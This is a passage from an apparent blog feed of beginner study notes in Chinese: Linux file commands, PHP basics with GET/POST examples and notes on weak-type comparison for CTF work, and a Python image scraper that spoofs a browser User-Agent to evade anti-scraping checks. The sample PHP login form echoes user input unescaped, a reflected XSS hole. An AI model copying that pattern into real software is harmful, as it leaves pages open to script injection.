    <content type="html"><![CDATA[<h1 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h1><h2 id="1）文件处理命令"><a href="#1）文件处理命令" class="headerlink" title="1）文件处理命令"></a>1）文件处理命令</h2><h4 id="1-ls命令（目录处理命令）"><a href="#1-ls命令（目录处理命令）" class="headerlink" title="1.ls命令（目录处理命令）"></a><strong>1.ls命令（目录处理命令）</strong></h4><ul><li>​            ls 展示根目录下的文件</li></ul><ul><li>​            ls-a显示所有文件</li></ul><ul><li><p>​            ls-l 详细信息显示</p><ul><li>第三部分为所有者、第四部门为所属组、第五部分为文件大小(-h为人性化显示)</li></ul></li><li><p>开头十个字符：例：-rw-r–r–</p><ul><li>u(所有者)  g(所属组)  o(其他人)   （每三个一组）</li><li>​                r读         w写        x执行</li><li>表示文件、 d 表示目录、 l 为软链接（最常见的三种）</li></ul></li><li><p>​            ls-d 查看目录属性</p></li><li><p>​            目录处理命令</p><ul><li>mkdir、cd 、pwd（显示当前所在目录，绝对路径）、rmdir（删除空目录）、cp    </li><li>mkdir -p[目录名]  创建新目录  -p 递归创建</li><li>cd / （进入目录）  cd..(回到上一级目录)</li><li>cp -r （复制目录） 例：cp-r /要复制的目录/复制到哪      cp-p （保留文件属性）</li></ul></li></ul><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-基础命令&quot;&gt;&lt;a href=&quot;#1-基础命令&quot; class=&quot;headerlink&quot; title=&quot;1.基础命令&quot;&gt;&lt;/a&gt;1.基础命令&lt;/h1&gt;&lt;h2 id=&quot;1）文件处理命令&quot;&gt;&lt;a href=&quot;#1）文件处理命令&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="-Linux" scheme="https://abinix.top/categories/Linux/"/>
    
    
    <category term="-Linux" scheme="https://abinix.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习笔记</title>
    <link href="https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-04-21T15:50:34.000Z</published>
    <updated>2021-07-20T14:06:01.250Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">PHP学习笔记<h1<h2 id="😀编写代码及其部署环境"><a href="#😀编写代码及其部署环境" class="headerlink" title="😀编写代码及其部署环境"></a>😀编写代码及其部署环境</h2><p>对于php环境，我采用的是集成环境，用软件 <strong>Wampserver64</strong>，双击软件后，在浏览器输入本地地址，即<strong>127.0.0.1</strong> 或者 <strong>localhost</strong>都可以</p><p>我们可以看到在该地址下的文件，（上图的一些文件都是我在本地弄的php文件）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efec6e1e655.jpg"></p><p>​                                                                                                    </p><p>如下图，可以看到在E盘下的wamp64下的www文件夹下即是我们php的文件</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efedaa0d266.jpg"></p><p>接下来，我们在编译器 <strong>Zend Studio</strong>里写一句简单的php代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efeefe6c7d1.jpg"></p><p>打开本地网站，如下图，可以看到hello成功被输出了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efeeb21dce5.jpg"></p><h2 id="😀PHP阶段学习笔记"><a href="#😀PHP阶段学习笔记" class="headerlink" title="😀PHP阶段学习笔记"></a>😀PHP阶段学习笔记</h2><h3 id="1-1PHP概念"><a href="#1-1PHP概念" class="headerlink" title="1.1PHP概念"></a>1.1PHP概念</h3><blockquote><p>1.PHP的主要目标是允许网络开发人员快速编写动态页面。</p><p>2.细化点说PHP可以用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文        件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他相关操作！</p><p>3.PHP是脚本语言不需要事先编译,在服务器端运行！ </p></blockquote><h3 id="1-2PHP语法"><a href="#1-2PHP语法" class="headerlink" title="1.2PHP语法"></a>1.2PHP语法</h3><p>​        1.PHP开始标记：<?php​        2.PHP结束标记：?><br>​        3.在一些PHP语句的结尾要加上(功能执行语句){在结构定义语句可以不用分号},分号表示一句话的结束,?&gt;就隐含一个分号，所以PHP代码最后一行可以不加分号。<br>​        4.注释 多行注释:/<em>……</em>/  单行注释://</p><p>​        5.换行符 得加引号 <code>&lt;b&gt;</code></p><h3 id="1-3变量"><a href="#1-3变量" class="headerlink" title="1.3变量"></a>1.3变量</h3><p>​        1.<strong>PHP程序中使用变量不需要声明</strong>，这是python和c的不同</p><p>​        2.变量的销毁：unset($变量名称)</p><p>​        3.变量的<strong>命名规则</strong>：</p><p>​            1）严格区分大小写</p><p>​            2）字母或下划线开头</p><p>​            3）最好不要用关键字作为变量</p><p>​        4.可变变量<br>​            $abc=’test’; //定义了一个变量$abc里面存了值test<br>​            $$abc=’孙胜利’; //$test=’孙胜利’;</p><p>​        5.变量类型            </p><p>​            1）bool (布尔型) 存放ture与flase<br>​            2）int (整型)</p><p>​            3）float (浮点型，也称double）</p><p>​            4）string (在定义一些简单的字符串的时候使用单引号这种方法效率比较高！）<br>​            5）定界符（同样可以表示变量，用&lt;&lt;&lt;）</p><p>​                $a=&lt;&lt;&lt;www<br>​               dwqdqwdwq{$b}dwqdqdqdqdwqdwqcwcfwefwefcscwecwefwdqwdqdefwefwefewfwe<br>​                www; </p><p>​            6）array (数组)<br>​            7）object (对象)<br>​            8）resource (资源)<br>​            9）NULL（null表示一个变量没有值，表示空）</p><h3 id="1-4常量"><a href="#1-4常量" class="headerlink" title="1.4常量"></a>1.4常量</h3><p><strong>”var_dump”</strong>是PHP中的调试函数，用于判断一个变量的类型与长度，并输出变量的数值。</p><p>1.定义和使用</p><p>​    <strong>define</strong>(‘常量名称’,常量值) 或者 define(“常量名称”,常量值)<br>​    常量的命名和变量一样 只能包含字母数字下划线 并且必须以字母或者下划线开头（通常是大写）<br>​    defined()函数来检查是否定义了某个常量</p><p>2.预定义常量（也叫魔术常量）</p><p>​    通常以__开头 常用的有：</p><p>​    <strong><code>__LINE__</code></strong> 、 **<code>__FILE__ 、__DIR__</code><strong>、</strong><code>__FUNCTION__</code><strong>、</strong><code>__CLASS__</code><strong>、</strong><code>__TRAIT__</code>**、                     **<code>__METHOD__</code><strong>、</strong><code>__NAMESPACE__</code>**、</p><h3 id="1-5运算符（总体和c差不多）"><a href="#1-5运算符（总体和c差不多）" class="headerlink" title="1.5运算符（总体和c差不多）"></a>1.5运算符（总体和c差不多）</h3><p><strong>1.++ 自增</strong> </p><p>前++    在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自增之后的值！<br>后++<br>        当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去执行自增</p><p><strong>2.字符串运算符</strong><br>    . 连接运算符<br>    $a=’孙胜利’;<br>    $b=’测试字符串连接符’;<br>    echo $a.$b;</p><p><strong>3.逻辑运算符</strong> （参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！）</p><p>​    逻辑异或：xor</p><p><strong>4.其他运算符</strong></p><p>​    1)?  :  （三元运算）<br>​        格式： 表达式1 ? 表达式2 : 表达式3;<br>​        如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3</p><p>​    2)``</p><p>​        可以把系统的命令放在里面执行！例如：$a=`ipconfig`\</p><p>​    3)@  屏蔽表达式可能发生的错误！或者不想显示此处的错误</p><p>​    4)=&gt;<br>​    5)-&gt;<br>​    6)instanceof 确定一个 PHP 变量是否属于某一类</p><p><strong>5.运算符的优先级</strong></p><h3 id="1-6流程控制"><a href="#1-6流程控制" class="headerlink" title="1.6流程控制"></a>1.6流程控制</h3><p>1.<strong>if</strong>(与c和python使用相同)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">15</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0df67c1dad.jpg"></p><p>​            </p><p>然后我们知道100肯定大于15，所以我们会在本地看到 输出了success！。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0dfa31586e.jpg"></p><p>2.<strong>switch</strong>(与c和python使用相同)</p><p>​    1)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break</p><p>​    2)case后面的语句块是不需要{}括起来的</p><p>3.<strong>while和do while</strong>(与c和python使用相同)</p><p>​        与while语句区别就是，do while语句至少会执行一次！</p><p>4.<strong>for</strong>(与c使用相同)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;di <span class="subst">&#123;$i&#125;</span>cao zuo &lt;br /&gt;&quot;</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图，可以看到语句被执行了九次</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0e51792e54.jpg"></p><p>5.<strong>break</strong>语句<br>​                    作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！<br>​                    后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！<br>​6.<strong>continue</strong>语句<br>​                    作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！<br>​7.**exit()<strong>语句或</strong>die()**语句<br>​                    作用：结束当前整个程序的执行！ 函数输出一条消息，并退出当前脚本。</p><h3 id="1-7-GET传参"><a href="#1-7-GET传参" class="headerlink" title="1.7 GET传参"></a>1.7 GET传参</h3><blockquote><p>  GET是网页传值常用的一种方式，它能够将紧跟在域名后<strong>第一个问号后的值</strong>或者&amp;符号后面的值以GET数组的形式接收进页面</p></blockquote><blockquote><p><strong>GET传参特点</strong></p><p>1get方式传递的参数可以在页面上看见，So安全性不高，反之post安全性高<br>2get方式传递的速度快。<br>在后台定义了get,set方法可以直接获取，不用getParameter(“name”);<br>$.get(….) $.ajax(….) $.getJSON(….)3个都是ajax传递<br>只是方式不同。<br>$.get()是以get方式传递到后台<br>$.ajax()需要你配置传递到后台的方式，而且功能比$.get()方法多，建议使用这个方法<br>$.getJSON()传递的是json数据类型</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>&gt;<span class="variable">$c</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nice success!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们打开本地网页看一下结果吧</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0f33310a7e.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0f333119ac.jpg"></p><p>当我们输入<code>?b=2&amp;d=4</code>时，显然是d大，所以$a&lt;$c ,输出no</p><p>当我们输入?b=4&amp;d=2时，显然是b大，所以$a&gt;$c ,输出nice success!</p><h3 id="1-8-POST传参"><a href="#1-8-POST传参" class="headerlink" title="1.8 POST传参"></a>1.8 POST传参</h3><blockquote><p> <strong>Post</strong>请求有如下特性：数据是放在<strong>HTTP</strong>主体中的，其组织方式不只一种，有&amp;连接方式，也有分割符方式，可隐藏参数，传递大批数据，比较方便,也更安全，<strong>post</strong> 地址栏不会出现一大串?bjnghfgreygt这样的东西</p></blockquote><p>与GET传参的区别</p><blockquote><p><strong>Get</strong>是向服务器发索取数据的一种请求；而<strong>Post</strong>是向服务器提交数据的一种请求，要提交的数据位于信息头后面的实体中。</p><p>很理论化，但是很标准，method=“<strong>get</strong>”并不是从服务器上获取数据，<strong>get</strong>和<strong>post</strong> 只是发送机制不同，并不是一个取一个发！</p><p><strong>get</strong>方法会在IE地址栏里显示表示你提交时候所带的值；<strong>post</strong>方法不会</p></blockquote><ul><li>以下是一个简单的post传参代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;post&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你好呀，成功传参啦！&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f1338f628ef.jpg"></p><p>如图我们用<strong>hackbar工具</strong>进行传参，让<code>what=post</code> 这样页面中输出了 你好呀，成功传参啦！</p><ul><li>以下是我自己编写的post传参代码，可以实现一个<strong>登录框</strong>的效果，登陆后也有回显，采用<strong>post传参</strong>方式</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>使用$_POST[]获取表单数据<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&lt;?php if(!isset($_POST[&quot;submit&quot;])): ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;?php endif; ?&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&quot;submit&quot;]))&#123;</span><br><span class="line">$name=$_POST[&quot;username&quot;];</span><br><span class="line">$pw=$_POST[&quot;password&quot;];</span><br><span class="line">echo &quot;欢迎登陆！,$name&quot;;</span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">br</span>/&gt;</span>&quot;; </span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;JavaScript:history.back()&#x27;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f1349998a35.jpg"></p><p>当我们提交表单后，可以发现页面跳转</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f13465115b4.jpg"></p><h3 id="1-9-函数"><a href="#1-9-函数" class="headerlink" title="1.9 函数"></a>1.9 函数</h3><p>1.function 函数名([形式参数1,形式参数2,….形式参数n]){</p><p>​            }</p><p>2.PHP变量的范围</p><p>​        1.<u>局部变量</u><br>​                function test(){<br>​                $a=1;//局部变量$a，尽在这个函数内部有效<br>​                }<br>​                echo $a;</p><p>​        2.全局变量<br>​                $i=10;//全局变量（外部变量）<br>​                define(‘MY_NAME’,’孙胜利’);<br>​                function test(){<br>​                echo MY_NAME;<br>​                <strong><u><em>global</em></u></strong> $i;//声明$i为全局变量,然后再这个函数内部就可以使用$i<br>​                echo $i;<br>​                $a=1;<br>​                }<br>​                test();</p><p>​        3.静态变量<br>​                function test(){<br>​                static $a=10;//静态变量$a,初始化静态变量,尽在第一次调用的时候执行<br>​                echo ++$a;//当第二次执行这个函数的时候$a这个变量依然存在并且里面的也值依然存在！<br>​                }</p><p>​        4.参数的传递</p><p>​                1)按值传递参数(默认,最常用)</p><p>​                        function test($a){}</p><p>​                        $i=10</p><p>​                        text($i)</p><p>​                2)按引用传递参数(相当于形式参数和实际参数指的是同一个)</p><p>​                        function text(&amp;$a){}</p><p>​                        $i=10</p><p>​                        text($i)       /* $i的值始终与$a相等*/</p><p>​                3)函数的默认参数</p><p>​                        给形式参数加默认值的时候是重右往左加的    </p><p>​                3).可变长度参数列表</p><p>​                        func_get_args();（可以调用函数里的全部参数）<br>​                        func_get_arg();（类似数组，括号里输入数字可以获取第几个实参）<br>​                        func_num_args();（获取调用的参数数量）</p><p>​        5.递归函数</p><p>​            <strong>递归函数即在函数内部自己调用自己的函数。</strong></p><p>​            1)里面的变量默认都是局部变量，相互之间没有影响！没有联系，只是存储了数据。</p><p>​            2)递归函数，在函数的内部需要有适时结束函数运行的条件！</p><p>​            3)为什么要回归？</p><p>​            因为之前的程序没执行完，只执行了if语句，当n=0时返回上一级调用它的地方，即输出<code>%n.&amp;nbsp</code></p><p>下图为递归函数流程图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0e912a00d7.jpg"></p><h3 id="2-0数组"><a href="#2-0数组" class="headerlink" title="2.0数组"></a>2.0数组</h3><p>​    1.array()函数  变量名称[索引值]=数据    变量名称[]=数据  （从0开始） 也可用索引值=&gt;数据导入</p><p>​    多维数组：变量名称[]]]</p><p>​    2.数组遍历</p><p>​    1) for循环<br>​    2) foreach语句</p><p>​        <code>foreach(数组变量 as 变量1)&#123;</code></p><p>​                <code>echo 变量1;</code></p><p>​        <code>&#125;</code></p><p>​        <code>foreach(数组变量 as 变量1=&gt;变量2)&#123;</code></p><p>​                    <code>cho 变量1.&#39;=&gt;&#39;.变量2;</code></p><p>​        <code>&#125;</code></p><h2 id="PHP弱类型比较"><a href="#PHP弱类型比较" class="headerlink" title="PHP弱类型比较"></a>PHP弱类型比较</h2><p> <strong>1.****==与===</strong></p><p>==为弱相等，也就是说12==”12” –&gt; true，而且12==”12cdf” –&gt; true，只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000.</p><p>而且bool类型的true和任意字符串的弱类型相等</p><p>===为完全相等，数据类型和值都相等时返回true。</p><h2 id="CTF中见到过的函数整理"><a href="#CTF中见到过的函数整理" class="headerlink" title="CTF中见到过的函数整理"></a>CTF中见到过的函数整理</h2><ul><li>in_array（$x1,$x2）（判断x1是否匹配x2，或在不在数组中）</li><li>is_string（判断是否为字符串）</li><li>mb_substr（$page，0，2）（是一个截断函数，返回0—2之间的内容）</li><li>mb_strpos（查找字符串在另一个字符串中首次出现的位置）</li><li>strstr（””$1”,”$2”）（查找 “$2” 在 “$1” 中是否存在，如果是，返回该字符串及后面剩余部分：）</li><li>str_replace(“$1”,”$2”,”$3”)（把$3中的字符$1替换成$2）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;PHP学习笔记&lt;h1



&lt;h2 id=&quot;😀编写代码及其部署环境&quot;&gt;&lt;a href=&quot;#😀编写代码及其部署环境&quot; class=&quot;headerlink&quot; title=&quot;😀编写代码及其部署环境&quot;&gt;&lt;/a&gt;😀编写代码及其部署环境&lt;/h</summary>
      
    
    
    
    <category term="-PHP" scheme="https://abinix.top/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>爬虫与面向对象爬虫</title>
    <link href="https://abinix.top/2021/04/21/%E7%88%AC%E8%99%AB/"/>
    <id>https://abinix.top/2021/04/21/%E7%88%AC%E8%99%AB/</id>
    <published>2021-04-21T10:50:00.000Z</published>
    <updated>2021-07-20T14:14:00.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="普通面向对象（爬取burst-shopify-com下的图片）"><a href="#普通面向对象（爬取burst-shopify-com下的图片）" class="headerlink" title="普通面向对象（爬取burst.shopify.com下的图片）"></a>普通面向对象（爬取burst.shopify.com下的图片）</h1><h3 id="总体思想"><a href="#总体思想" class="headerlink" title="总体思想:"></a><strong>总体思想</strong>:</h3><ol><li>​    观察网页构造，为写代码做准备，检查是否有反爬技术</li><li>​    检查所要下载的图片，观察格式，并且构造正则表达式</li><li>​    过滤重复的图片</li><li>​    保存图片，并作相关优化</li></ol><h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;animals&#x27; &#x27;city&#x27; &#x27;home&#x27; &#x27;seasons&#x27; &#x27;education&#x27; &#x27;landscape&#x27; &#x27;family&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;love&#x27; &#x27;around the world&#x27; &#x27;arts&#x27; &#x27;technology&#x27; &#x27;outdoor&#x27; &#x27;backgrounds&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fashion&#x27; &#x27;beauty&#x27; &#x27;people&#x27; &#x27;transportation&#x27; &#x27;business&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fitness&#x27; &#x27;travel&#x27; &#x27;flowers&#x27; &#x27;work&#x27; &#x27;food&#x27; &#x27;holidays&#x27; &#x27;celebrate&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#123;设置头，反爬&#125;</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;请从上面挑选出要下载的图片类型：&#x27;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一共要下载的页数：&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;请求url与编写正则表达式&#125;</span></span><br><span class="line"><span class="keyword">if</span> num &gt;= <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> j &lt;= num:</span><br><span class="line">        url = <span class="string">&#x27;https://burst.shopify.com/&#x27;</span> + key + <span class="string">&#x27;?page=&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        resp=requests.get(url,headers=headers)</span><br><span class="line">        html=resp.text</span><br><span class="line">        urls=re.findall(<span class="string">&quot;https://burst.*?jpg&quot;</span>, html)</span><br><span class="line">        lst=[]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;当第二页刷新时有和第一页相同的图片,所以以下为去重代码&#125;</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(i)</span><br><span class="line">        <span class="keyword">elif</span> j&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst2 <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:  <span class="comment">#判断新urls里的jpg是否与lst列表里的相同</span></span><br><span class="line">                    lst.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;保存图片&#125;</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> lst:</span><br><span class="line">            file_name =<span class="string">&quot;E:/大学/python爬虫/&quot;</span>+ <span class="built_in">str</span>(j) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span>   <span class="comment">#设置文件名</span></span><br><span class="line">            resp = requests.get(url, headers=headers)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:    <span class="comment">#以二进制的方式写进</span></span><br><span class="line">                f.write(resp.content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在下载第&#123;0&#125;页第&#123;1&#125;张图片&quot;</span>.<span class="built_in">format</span>(j,x))</span><br><span class="line">            x=x+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;计数部分&#125;</span></span><br><span class="line">            <span class="keyword">if</span> x==<span class="built_in">len</span>(lst):</span><br><span class="line">                <span class="keyword">if</span> j != <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">pass</span>        <span class="comment"># 这一部分if指lst2=lst只执行一次，</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lst2 = lst</span><br><span class="line">                x=<span class="number">0</span></span><br><span class="line">                j=j+<span class="number">1</span></span><br><span class="line">                count += <span class="built_in">len</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;下载完成！共下载&#123;0&#125;张图片&quot;</span>.<span class="built_in">format</span>(count))</span><br></pre></td></tr></table></figure><h1 id="面向对象爬虫（爬取burst-shopify-com下的图片）"><a 